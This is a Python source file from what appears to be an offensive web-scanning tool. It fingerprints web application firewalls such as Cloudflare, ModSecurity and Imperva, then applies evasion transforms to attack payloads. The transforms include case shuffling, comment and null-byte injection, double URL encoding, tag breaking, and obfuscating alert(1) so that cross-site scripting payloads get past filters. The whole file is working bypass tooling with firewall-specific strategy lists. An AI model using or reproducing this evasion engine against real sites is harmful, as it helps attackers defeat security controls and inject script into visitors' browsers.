"""
waf_bypass/detector.py
WAF fingerprinting and adaptive evasion strategy engine.
"""

import re
import random
import urllib.parse
from typing import Optional, List, Tuple

from utils.config import WAF_SIGNATURES
from utils.logger import debug


class WAFDetector:
    BLOCK_STATUS_CODES = {400, 403, 406, 419, 429, 503}

    @classmethod
    def detect(cls, response) -> Optional[str]:
        if response is None:
            return None
        if response.status in cls.BLOCK_STATUS_CODES:
            for waf_name, sigs in WAF_SIGNATURES.items():
                for sig in sigs:
                    for hdr_val in response.headers.values():
                        if sig.lower() in hdr_val.lower():
                            return waf_name
            body_lower = response.text.lower()
            body_checks = {
                "Cloudflare":  ["attention required"],
                "ModSecurity": ["mod_security"],
                "Imperva":     ["incapsula incident"],
                "Sucuri":      ["sucuri website firewall"],
                "Wordfence":   ["wordfence"],
            }
            for waf_name, patterns in body_checks.items():
                if patterns[0] in body_lower:
                    return waf_name
            return "Unknown WAF"
        all_headers = " ".join(f"{k}:{v}" for k, v in response.headers.items()).lower()
        for waf_name, sigs in WAF_SIGNATURES.items():
            for sig in sigs:
                if sig.lower() in all_headers:
                    return waf_name
        return None

    @classmethod
    def is_blocked(cls, baseline_len: int, response_len: int, status: int) -> bool:
        if status in cls.BLOCK_STATUS_CODES:
            return True
        if baseline_len > 0:
            ratio = response_len / baseline_len
            if ratio < 0.3 or ratio > 3.5:
                return True
        return False


class EvasionEngine:
    _WAF_STRATEGIES = {
        "Cloudflare":  ["case_shuffle", "unicode_normalize", "double_encode"],
        "ModSecurity": ["comment_inject", "null_byte", "tab_substitute"],
        "Imperva":     ["double_encode", "unicode_normalize"],
        "AWS WAF":     ["case_shuffle", "html_entity_partial"],
        "Akamai":      ["comment_inject", "tab_substitute", "double_encode"],
        "Unknown WAF": ["case_shuffle", "comment_inject", "double_encode"],
    }
    _ALL = ["case_shuffle","comment_inject","double_encode","null_byte",
            "tab_substitute","unicode_normalize","html_entity_partial",
            "tag_break","event_obfuscate","slash_insert"]

    def apply(self, payload: str, waf: Optional[str] = None) -> List[Tuple[str, str]]:
        results = []
        ordered = list(self._WAF_STRATEGIES.get(waf, []) if waf else [])
        for k in self._ALL:
            if k not in ordered:
                ordered.append(k)
        fns = {
            "case_shuffle":        self._case_shuffle,
            "comment_inject":      self._comment_inject,
            "double_encode":       self._double_encode,
            "null_byte":           self._null_byte,
            "tab_substitute":      self._tab_substitute,
            "unicode_normalize":   self._unicode_normalize,
            "html_entity_partial": self._html_entity_partial,
            "tag_break":           self._tag_break,
            "event_obfuscate":     self._event_obfuscate,
            "slash_insert":        self._slash_insert,
        }
        for name in ordered:
            fn = fns.get(name)
            if fn:
                try:
                    v = fn(payload)
                    if v and v != payload:
                        results.append((v, name))
                except Exception:
                    pass
        return results

    @staticmethod
    def _case_shuffle(p):
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in p)
    @staticmethod
    def _comment_inject(p):
        for kw in ["script","onerror","onload","alert","iframe"]:
            if kw in p.lower():
                i = p.lower().index(kw) + len(kw)//2
                return p[:i] + "<!---->" + p[i:]
        return p
    @staticmethod
    def _double_encode(p):
        return urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")
    @staticmethod
    def _null_byte(p):
        return p.replace("script","scr\x00ipt")
    @staticmethod
    def _tab_substitute(p):
        return p.replace(" ","\t")
    @staticmethod
    def _unicode_normalize(p):
        return p.replace("alert","\u0061\u006c\u0065\u0072\u0074")
    @staticmethod
    def _html_entity_partial(p):
        return p.replace("<","&#60;").replace(">","&#62;")
    @staticmethod
    def _tag_break(p):
        return p.replace("<img","<img/").replace("<svg","<svg/")
    @staticmethod
    def _event_obfuscate(p):
        return p.replace("alert(1)","window['al'+'ert'](1)")
    @staticmethod
    def _slash_insert(p):
        return re.sub(r"(<\w+)",r"\1/",p,count=1)
